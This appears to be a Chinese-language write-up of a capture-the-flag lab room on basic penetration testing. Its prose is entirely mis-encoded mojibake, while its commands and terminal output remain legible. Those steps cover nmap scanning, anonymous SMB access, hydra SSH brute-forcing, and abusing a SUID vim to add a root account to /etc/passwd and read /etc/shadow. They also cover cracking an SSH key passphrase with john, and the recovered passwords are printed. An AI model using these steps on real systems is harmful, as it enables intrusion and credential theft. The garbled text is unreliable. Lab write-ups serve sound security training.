# åŸºæœ¬æ¸—é€æµ‹è¯•room

    åœ¨è¿™äº›ä»»åŠ¡é›†ä¸­ï¼Œæ‚¨å°†äº†è§£ä»¥ä¸‹å†…å®¹ï¼š

    æš´åŠ›ç ´è§£
    å“ˆå¸Œç ´è§£
    æœåŠ¡æšä¸¾
    Linux æšä¸¾

è¿™é‡Œçš„ä¸»è¦ç›®æ ‡æ˜¯å°½å¯èƒ½å¤šåœ°å­¦ä¹ ã€‚ç¡®ä¿æ‚¨ä½¿ç”¨OpenVPNé…ç½®æ–‡ä»¶è¿æ¥åˆ°æˆ‘ä»¬çš„ç½‘ç»œã€‚

éƒ¨ç½²æœºå™¨å¹¶è¿æ¥åˆ°æˆ‘ä»¬çš„ç½‘ç»œ
æŸ¥æ‰¾è®¡ç®—æœºå…¬å¼€çš„æœåŠ¡

æŒ‰ç…§ä¸Šé¢è¿™å¥è¯ï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨nmapç®€å•æ‰«ä¸€åœˆ

<pre><font color="#367BF0">â”Œâ”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nmap</font> <font color="#9755B3">-sS</font> 10.10.135.111
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-07 18:17 CST
Nmap scan report for 10.10.135.111 (10.10.135.111)
Host is up (0.23s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
</pre>

è®¿é—®80ç«¯å£çš„webï¼Œå¥½åƒæ²¡ä¸œè¥¿ï¼Œåˆ°8080ç«¯å£çœ‹ä¸€ä¸‹ï¼Œæœ‰ç½‘é¡µ

#### 1.WebæœåŠ¡å™¨ä¸Šéšè—ç›®å½•çš„åç§°æ˜¯ä»€ä¹ˆï¼ˆè¾“å…¥ä¸å¸¦/çš„åç§°ï¼‰ï¼Ÿ

ç”¨gobusterå’Œffufå¯¹ç€8080ç«¯å£ä¸€é¡¿æ‰«ï¼Œæ‰«äº†ä¸¤ä¸ªå¤šå°æ—¶ï¼Œå­—å…¸æ¢äº†å¥½å‡ ä¸ªï¼Œéƒ½æ²¡æ‰«å‡ºæ¥ã€‚

çªç„¶æƒ³èµ·æ¥è¿˜æœ‰ä¸ª80ç«¯å£ï¼Œç„¶åæ¢80ç«¯å£ï¼Œä¸€ä¸‹å°±æ‰«å‡ºæ¥äº†

    gobuster dir --url http://10.10.41.41:80/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

/development

æ˜¯çš„,ipå˜äº†ï¼Œæ‰«åˆ°é¶æœºéƒ½åˆ°æœŸè‡ªåŠ¨å…³æœºäº†

#### 2.ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ

æç¤ºæˆ‘ä»¬smbæ‰¾ï¼Œå°è¯•åŒ¿åç”¨æˆ·ç™»å½•smb

<pre><font color="#367BF0">â”Œâ”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">smbclient</font> //10.10.41.41/Anonymous    
Password for [WORKGROUP\root]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Apr 20 01:31:20 2018
  ..                                  D        0  Fri Apr 20 01:13:06 2018
  staff.txt                           N      173  Fri Apr 20 01:29:55 2018

</pre>

å°†staff.txt ä¸‹è½½ï¼Œæ‰“å¼€ï¼ˆç¿»è¯‘ï¼‰ï¼š

    å‘å‘˜å·¥å‘å¸ƒçš„å…¬å‘Šï¼š

    è¯·ä¸è¦å°†ä¸å·¥ä½œæ— å…³çš„é¡¹ç›®ä¸Šä¼ åˆ°æ­¤å…±äº«ã€‚æˆ‘çŸ¥é“è¿™ä¸€åˆ‡éƒ½å¾ˆæœ‰è¶£ï¼Œä½†æ˜¯
    é”™è¯¯å°±æ˜¯è¿™æ ·å‘ç”Ÿçš„ã€‚ï¼ˆè¿™ä¹Ÿæ„å‘³ç€ä½ ï¼Œjanï¼

    -å‡¯

ç”¨æˆ·åä¸º jan, ç„¶åç”¨hydraçˆ†jançš„sshå¯†ç 

    hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.41.41 ssh -t 36

<pre>[<font color="#47D4B9"><b>22</b></font>][<font color="#47D4B9"><b>ssh</b></font>] host: <font color="#47D4B9"><b>10.10.31.12</b></font>   login: <font color="#47D4B9"><b>jan</b></font>   password: <font color="#47D4B9"><b>armando</b></font>
</pre>

æ˜¯çš„ï¼Œipåˆå˜äº†ï¼Œçˆ†ä¸€åŠé¶æœºå…³æœºäº†ï¼Œçˆ†ç ´æ˜¯æœ€æ— èŠçš„æ”»å‡»


###############################

é€šè¿‡janå’Œçˆ†ç ´å‡ºæ¥çš„å¯†ç ï¼Œç™»å½•ssh

å¹³å¹³æ— å¥‡çš„ä¿¡æ¯æ”¶é›†:

    uname -a
    sudo -lçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå‘½ä»¤æœ‰ä»·å€¼

    find / -type f -perm 04000 2>/dev/nullæŸ¥æ‰¾å…·æœ‰suidçš„æ–‡ä»¶

å¯ä»¥çœ‹åˆ°vimå…·æœ‰suidï¼Œvimå¯ä»¥è¯»å†™æ–‡ä»¶ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶suidï¼Œè¶Šæƒè¯»å†™æ–‡ä»¶

ç›´æ¥ vim /etc/passwdï¼Œæ‰‹åŠ¨æ·»åŠ ç”¨æˆ·

å…ˆé€šè¿‡openssl passwdåˆ›å»ºåŠ ç›hashå¯†ç ï¼š

<pre><font color="#367BF0">â”Œâ”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">openssl</font> <u style="text-decoration-style:single">passwd</u> <font color="#9755B3">-1</font> <font color="#9755B3">-salt</font> hack 1q2w3e4r                                  12 <font color="#EC0101"><b>â¨¯</b></font>
$1$hack$eu7wA.3faDMt9Z2srODT9/
</pre>

ç„¶åvimç¼–è¾‘/etc/passwd

<pre><font color="#05A1F7"><b>root</b></font>:<font color="#FFD7D7">x</font>:<font color="#962AC3">0</font>:<font color="#962AC3">0</font>:<font color="#05A1F7">root</font>:<font color="#87FFAF">/root</font>:<font color="#FF8A18">/bin/bash</font>
<font color="#05A1F7"><b>sugo</b></font>:<font color="#962AC3">$1$hack$eu7wA.3faDMt9Z2srODT9/</font>:<font color="#962AC3">0</font>:<font color="#962AC3">0</font>:<font color="#05A1F7">root</font>:<font color="#87FFAF">/root</font>:<font color="#FF8A18">/bin/bash</font>

:wq!
</pre>

ç…§ç€rootæŠ„å³å¯

<pre>jan@basic2:/usr/bin$ su sugo
Password: 
root@basic2:/usr/bin# whoami
root
</pre>

ææƒåï¼Œå›å»çœ‹ä¸€ä¸‹ä»»åŠ¡ï¼Œé—®çš„æ˜¯å¯†ç ï¼Œä½†æ˜¯é€è¿‡å›ç­”æ¡†çš„ä¸€å †*å·ï¼Œæˆ‘æ‰“ç®—çœ‹ä¸€ä¸‹kayçš„home:

    å‘ç°pass.bakæ‰“å¼€çœ‹ä¸€ä¸‹ï¼Œæ‹¿å»æäº¤ï¼Œpass

<pre>root@basic2:/# ls -la /home/kay
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 <font color="#277FFF"><b>.</b></font>
drwxr-xr-x 4 root root 4096 Apr 19  2018 <font color="#277FFF"><b>..</b></font>
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 <font color="#277FFF"><b>.cache</b></font>
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 <font color="#277FFF"><b>.nano</b></font>
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Dec 10 07:04 <font color="#277FFF"><b>.ssh</b></font>
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
root@basic2:/# cat /home/kay/pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</pre>


### èŠ±çµ®

ç”±äºæµè§ˆå™¨ä½¿ç”¨äº†å¾®è½¯ç¿»è¯‘ï¼Œå¯¼è‡´å›ç­”æ¡†ç¼ºå¤±äº†å¤§éƒ¨åˆ†æ˜Ÿå·ï¼Œæ²¡èƒ½åˆ¤æ–­åˆ°ä¸Šè¿°ï¼Œä»¥ä¸ºé—®çš„æ˜¯kayçš„åŸå¯†ç :::


æˆ‘ä»¬é€šè¿‡vimè¯»å–/etc/shadow,åœ¨æ”»å‡»æœºåˆ©ç”¨unshadowåˆå¹¶ç„¶ååˆ©ç”¨johnå°è¯•çˆ†ç ´ï¼š


rockyouçˆ†äº†åŠå¤©å‘ç°è¿˜æ²¡çˆ†å®Œï¼Œä¼°è®¡è¡Œä¸é€šã€‚

å›åˆ°roomçœ‹æç¤ºï¼š

    é™¤äº†å¯†ç ï¼Œç”¨æˆ·è¿˜å¯ä»¥è®¿é—®è®¡ç®—æœºï¼Ÿ

ç”±äºæ˜¯è‹±è¯­ç¿»è¯‘çš„ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æ²¡ååº”è¿‡æ¥ï¼Œå…¶å®æ„æ€å°±æ˜¯kayç”¨æˆ·å¯ä»¥ä½¿ç”¨sshç™»å½•

æ ¹æ®è¿™ä¸ªçº¿ç´¢æˆ‘ä»¬å›åˆ°æˆ‘ä»¬åˆšåˆšè·å¾—çš„root shell çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°sshçš„å…¬ç§é’¥

æœä¸å…¶ç„¶ï¼š

<pre>root@basic2:/home/jan# find / -type f -name *rsa* 2&gt;/dev/null
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
...
</pre>

å°†ç§é’¥é€šè¿‡ssh2johnè½¬hashï¼Œå†ç”¨johnçˆ†å‡ºå¯†ç ï¼š

<pre><font color="#367BF0">â”Œâ”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">ssh2john</font> <u style="text-decoration-style:single">./kay_rsa</u> <font color="#277FFF"><b>&gt;</b></font> ./hash
                                                                                
<font color="#367BF0">â”Œâ”€â”€(</font><font color="#EC0101"><b>rootğŸ’€kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">â””â”€</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">john</font> <font color="#9755B3">--wordlist=/usr/share/wordlists/rockyou.txt</font> <u style="text-decoration-style:single">./hash</u>   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
<font color="#FEA44C">beeswax</font>          (<font color="#FEA44C">./kay_rsa</font>)     
</pre>

æäº¤ï¼Œç­”æ¡ˆé”™è¯¯ï¼Œæˆ‘tm

è®¤çœŸè¯»é¢˜ä¹‹åï¼Œæ‹¿ç€johnçˆ†ç ´æ¥çš„å¯†ç ç™»å½•è¿›å»å³å¯è·å¾—æœ€ç»ˆå¯†ç 
